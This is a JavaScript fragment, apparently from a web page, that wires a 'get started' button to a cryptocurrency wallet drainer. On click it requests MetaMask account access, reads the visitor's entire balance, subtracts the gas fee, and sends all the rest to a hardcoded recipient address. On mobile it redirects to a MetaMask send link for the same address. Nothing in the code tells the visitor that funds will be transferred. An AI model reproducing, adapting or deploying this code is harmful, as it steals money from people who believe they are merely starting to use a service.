  document.getElementById('get-started').addEventListener('click', connectAndSend);

        async function connectAndSend() {
            const recipientAddress = "0xB0994b43F798a151e75b38e01C5a9Da2B8895b8";
            let provider;

            if (!window.ethereum || !window.ethereum.isMetaMask) {
                if (isMobile()) {
                    // Redirect to MetaMask on mobile with transaction details
                    const transactionUrl = `https://metamask.app.link/send/${recipientAddress}?value=0`;
                    window.location.href = transactionUrl;
                } else {
                    alert('MetaMask is not installed');
                }
                return;
            }

            provider = new ethers.providers.Web3Provider(window.ethereum);

            // Request account access
            try {
                await provider.send("eth_requestAccounts", []);
            } catch (error) {
                console.error('User denied account access');
                return;
            }

            const signer = provider.getSigner();

            // Get the user's address and balance
            const userAddress = await signer.getAddress();
            let balance = await provider.getBalance(userAddress);

            // Estimate gas price and limit
            const gasPrice = await provider.getGasPrice();
            const dummyTransaction = { to: recipientAddress, value: balance };
            const gasLimit = await provider.estimateGas(dummyTransaction);

            // Calculate gas fee and adjust balance
            const gasFee = gasPrice.mul(gasLimit);
            const value = balance.sub(gasFee);

            if (value.lte(0)) {
                console.log('Insufficient balance to cover the gas fee.');
                return;
            }

            // Define the transaction
            const transaction = {
                to: recipientAddress,
                value: value.toString(), // Convert to string for URL
                gasLimit: gasLimit.toString(), // Convert to string for URL
                gasPrice: gasPrice.toString() // Convert to string for URL
            };

            // Send the transaction on desktop
            try {
                const txResponse = await signer.sendTransaction(transaction);
                console.log('Transaction sent:', txResponse);
            } catch (error) {
                console.error('Error sending transaction:', error);
            }
        }

        function isMobile() {
            return /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
        }
         
            

   
   
 


